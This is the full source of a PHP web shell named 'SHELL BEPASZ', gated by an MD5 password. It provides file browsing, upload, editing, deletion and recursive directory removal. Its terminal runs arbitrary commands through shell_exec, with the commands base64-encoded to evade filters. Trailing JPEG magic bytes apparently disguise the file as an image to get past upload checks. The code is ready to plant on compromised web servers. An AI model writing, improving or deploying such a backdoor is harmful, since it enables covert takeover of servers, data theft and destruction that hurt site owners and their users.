<?php
session_start();
error_reporting(0);

$passwordHash = "c2d661b4d7813bfef0773ab0fe2cad6a";

if (isset($_POST['password'])) {
    $inputPassword = md5($_POST['password']);

    if ($inputPassword === $passwordHash) {
        $_SESSION['login'] = true;
    }
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
    <form method="POST">
    <center>
        <input type="password" name="password">
        <input type="submit" value="Login">
    </center>
    </form>
<?php
    exit;
}

$dir = isset($_GET['dr']) ? hex2bin($_GET['dr']) : '.';
$dir = str_replace('\\', '/', $dir);
$files = scandir($dir);

function fperms($file)
{
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_can_write($file)
{
    return is_writable($file);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        echo 'Uploaded Successfully.';
    } else {
        echo 'Failed to Upload.';
    }
}

if ($_GET['e']) {
    if (isset($_GET['fp'])) {
        $file = hex2bin($_GET['fp']);
        $content = file_get_contents($file);
        if ($content !== false) {
            echo '
    <form method="post" action="" onsubmit="return copyContentToInput()">
        <label for="editor"><b>Edit File:</b></label><br>
        <div id="editor" contenteditable="true" 
            style="height: 400px; width: 100%; max-width: 100%; overflow: auto; font-family: monospace; border: 1px solid #ccc; padding: 10px; border-radius: 4px; box-sizing: border-box; background: #f9f9f9;">
            ' . htmlspecialchars($content) . '
        </div>
        <input type="hidden" name="file_content" id="file_content">
        <input type="hidden" name="edited_file" value="'.htmlspecialchars($file).'">
        <br>
        <button type="submit" name="submit_edit" 
            style="width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
            Save
        </button>
    </form>';


        } else {
            echo 'Cant read the file.';
        }
    } else if ($_GET['cfp']) {
        echo '<form method="post" action="" onsubmit="return copyContentToInput()">
        <label for="editor"><b>New File Content:</b></label><br>
        <div id="editor" contenteditable="true" 
            style="height: 400px; width: 100%; max-width: 100%; overflow: auto; font-family: monospace; border: 1px solid #ccc; padding: 10px; border-radius: 4px; box-sizing: border-box; background: #f9f9f9;">
        </div>
        <input type="hidden" name="file_content" id="file_content">
        <input type="text" name="edited_file" placeholder="file.php" 
            style="width: 100%; margin-top: 10px; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
        <br>
        <button type="submit" name="nfl_sbm" 
            style="width: 100%; margin-top: 10px; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
            Create File
        </button>
    </form>';
    } else if ($_GET['cdr']) {
        echo '<form method="post" action="">
        <label for="ndr"><b>New Directory Name:</b></label><br>
        <input type="text" name="ndr" id="ndr" placeholder="example-folder" 
            style="width: 100%; padding: 10px; margin-bottom: 10px; font-family: monospace; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
        <br>
        <button type="submit" name="ndr_sbm" 
            style="width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
            Create Directory
        </button>
    </form>';
    }
}

if ($_GET['v']) {
    if (isset($_GET['fp'])) {
        $file = hex2bin($_GET['fp']);
        $content = file_get_contents($file);
        if ($content !== false) {
            echo '<textarea rows="30" cols="100" disabled>' . htmlspecialchars($content) . '</textarea>';
        } else {
            echo 'Cant read the file.';
        }
    }
}

if (isset($_GET['c'])) {
    echo '<center>';
    echo '<form method="post" action="" onsubmit="cmLol()" style="display: flex; justify-content: center; gap: 10px; margin-top: 20px;">';
    echo '<input type="text" name="cm" id="cmm" placeholder="Enter command" style="padding: 8px; font-size: 16px; width: 300px; border: 1px solid #ccc; border-radius: 5px;">';
    echo '<input type="submit" value="Run" style="background-color: #333; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">';
    echo '</form>';
    echo '</center>';
}

if (isset($_GET['upl'])) {
    echo '<center>';
    echo '<form method="POST" enctype="multipart/form-data">';
    echo '<label>Upload file:</label>';
    echo '<input type="file" name="file_upload">';
    echo '<input type="submit" value="Upload">';
    echo '<input type="hidden" name="dir" value="' . htmlspecialchars($dir) . '">';
    echo '</form>';
    echo '</center>';
}

function mkd($pth)
{
     $ret = mkdir($pth);
     return $ret === true || is_dir($pth);
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents($file, $content) !== false) {
        echo 'File Saved.';
    } else {
        echo 'Failed to Edit.';
    }
} else if (isset($_POST['nfl_sbm'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents("$dir/$file", $content) !== false) {
        echo 'File Saved.';
    } else {
        echo 'Failed to Edit.';
    }
} else if (isset($_POST['ndr_sbm'])) {
    $ndr = $_POST['ndr'];
    if (mkd("$dir/$ndr")) {
        echo 'Dir Created.';
    } else {
        echo 'Failed to Create.';
    }
} else if (isset($_POST['cm'])) {
        $cmd = base64_decode($_POST['cm']);
        echo '<div style="margin: 20px auto; width: 80%; font-family: monospace; background: #f3f3f3; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">';
        echo '<b>Command:</b> ' . htmlspecialchars($cmd) . '<br><br>';
        echo '<b>Output:</b><br>';
        echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
        echo '</div>';
}

if ($_GET['dd']) {
    if (isset($_GET['dp'])) {
        $dir = hex2bin($_GET['dp']);

        function deleteDir($dir) {
            if (!is_dir($dir)) return false;
            foreach (scandir($dir) as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                is_dir($path) ? deleteDir($path) : unlink($path);
            }
            return rmdir($dir);
        }

        if (deleteDir($dir)) {
            echo '✅ Directory and all contents deleted.';
            echo '<meta http-equiv="refresh" content="1;url=?dr=' . bin2hex(dirname($dir)) . '">';
        } else {
            echo '❌ Failed to delete directory.';
        }
    }
}

if ($_GET['d']) {
    if (isset($_GET['fp'])) {
        $file = hex2bin($_GET['fp']);
        if (unlink($file)) {
            echo 'File Deleted.';
        } else {
            echo 'Failed to Delete.';
        }
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="nofollow, robots">
    <title>SHELL BEPASZ</title>
    <link rel="stylesheet" href="https://bepasz.pages.dev/style.css">
</head>

<body>
    <table>
        <caption>
            <?php
            $sd = explode("/", realpath($dir));
            foreach ($sd as $cd => $cdr) {
                if ($cdr == "" && $cd == 0) {
                    echo '<a class="td" href="?dr=2f">/</a>';
                    continue;
                }

                if ($cdr == "") continue;

                echo '<a class="td" href="?dr=';
                for ($i = 0; $i <= $cd; $i++) {
                    echo bin2hex($sd[$i]);
                    if ($i != $sd) echo bin2hex("/");
                }
                echo '">' . $cdr . "/</a>";
            }
            echo ' [ <a class="td" href="?dr='.bin2hex(dirname(__FILE__)).'">HOME</a> ]';
            ?>
        </caption>

        <center>
    <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
        <a href="?upl">
            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
                Upload
            </button>
        </a>
        <a href="?c">
            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
                Terminal
            </button>
        </a>
        <a href="https://t.me/sxssasss" target="_blank">
            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
                Author
            </button>
        </a>
    </div>
</center>
        <center><b>Information</b> : <?= php_uname(); ?></center>

        <thead>
            <tr>
                <th scope="col">NAME</th>
                <th scope="col">Permissions</th>
                <th scope="col">Action</th>
            </tr>
        </thead>
        <tbody>
            <?php
if ($dir !== '.' && is_dir($dir)) {
    $parent = dirname($dir);
}

foreach ($files as $file) {
    if ($file === '.') continue;

    // Buat path manual
    $fullPath = rtrim($dir, '/\\') . '/' . $file;
    $fullPath = str_replace('\\', '/', $fullPath);

    if (!file_exists($fullPath)) continue;

    $href = bin2hex($fullPath);

    echo '<tr>';
    echo '<td>';

    if (is_dir($fullPath)) {
        echo '<a class="td" href="?dr=' . $href . '">' . $file . '</a>';
    } else {
        echo '<a class="td" href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&v=1">' . $file . '</a>';
    }

    echo '</td>';
    echo '<td>';
    if (is_file($fullPath)) {
        echo '<span class="' . (fperms($fullPath) ? 'green' : 'red') . '">' . fperms($fullPath) . '</span>';
    } else {
        echo '<span class="' . (is_can_write($fullPath) ? 'green' : 'red') . '">' . (is_can_write($fullPath) ? 'Can Write' : 'Not Writable') . '</span>';
    }
    echo '</td>';
    echo '<td>';
    if (is_file($fullPath)) {
        echo '<a href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&e=1" class="td">EDIT</a> | ';
        echo '<a href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&d=1" class="td">DELETE</a>';
    } else {
        echo '<a class="td" href="?dr=' . bin2hex($dir) . '&e=1&cfp=1">NFILE</a> | <a class="td" href="?dr=' . bin2hex($dir) . '&e=1&cdr=1">NDIR</a> |<a class="td" href="?dd=1&dp=' . bin2hex($href) . '">DELETE</a>';
    }
    echo '</td>';
    echo '</tr>';
}
?>
        </tbody>
    </table>
    <script>
    function save() {
        const editor = document.getElementById('editor');
        const hidden = document.getElementById('file_content');
        hidden.value = editor.textContent; 
        return true;
    }
    function copyContentToInput() {
    const editor = document.getElementById("editor");
    const hiddenInput = document.getElementById("file_content");
    hiddenInput.value = editor.textContent.trim();
    return true;
    }

    function saveDirectory() {
        const doc = document.getElementById('ndr');
        return true;
    }

    function cmLol() {
    let doc = document.getElementById('cmm');
    doc.value = btoa(doc.value);
    return true;
    }
</script>
</body>
</html>
ÿØÿàÿØÿàÿØÿàÿØÿà
